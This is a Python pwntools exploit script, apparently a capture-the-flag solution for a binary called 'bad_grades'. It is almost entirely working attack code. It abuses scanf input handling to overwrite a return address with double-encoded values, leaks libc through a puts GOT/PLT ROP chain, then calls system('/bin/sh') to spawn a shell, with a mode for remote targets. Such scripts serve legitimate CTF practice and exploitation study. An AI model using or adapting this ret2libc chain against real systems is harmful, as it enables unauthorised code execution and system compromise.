#!/usr/bin/env python3

from pwn import *

e = ELF("./bad_grades_patched")
libc = ELF("./libc.so.6")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        # The 0x400fd5 is the vulnerable function address
        r = gdb.debug([e.path], '''
                      b *(0x400fd5)
                      b *(0x401107)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(0x4010f6)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def send_value(r, value):
    double_value = struct.unpack('<d', p64(value))[0]
    r.sendlineafter(b':', str(double_value).encode())


def main():
    r = conn()

    # scanf() will consume the input but not overwrite the target address content if the input is a single dot '.'.
    # and then just ret2libc

    # Note that this is not true for invalid expressions like `/`. The scanf() will not consume the input and leave it in the input buffer in this case,
    # which causes infinite loop for this challeng, which causes infinite loop for this challenge.

    # First ROP chain is to leak the libc base address, and then loop back.
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b':', b'39')
    # Skip the first few bytes and overwrite the return address directly
    for _ in range(35):
        r.sendlineafter(b':', b'.')
    pop_rdi = next(e.search(asm('pop rdi; ret')))
    send_value(r, pop_rdi)
    send_value(r, e.got.puts)
    send_value(r, e.plt.puts)
    send_value(r, 0x400fd5)
    r.recvline()
    data = r.recvuntil(b'Number of grades')
    puts_addr = u64(data[0:6] + b'\x00\x00')
    info(f'puts is at {hex(puts_addr)}')
    puts_offset = libc.sym.puts - libc.address
    libc.address = puts_addr - puts_offset

    # Second ROP chain is to get the shell.
    r.sendlineafter(b':', b'39')
    for _ in range(35):
        r.sendlineafter(b':', b'.')
    send_value(r, pop_rdi)
    bin_sh = next(libc.search(b'/bin/sh'))
    send_value(r, bin_sh)
    ret = next(e.search(asm('ret')))
    send_value(r, ret)  # For stack alignment
    send_value(r, libc.sym.system)

    r.interactive()

if __name__ == "__main__":
    main()
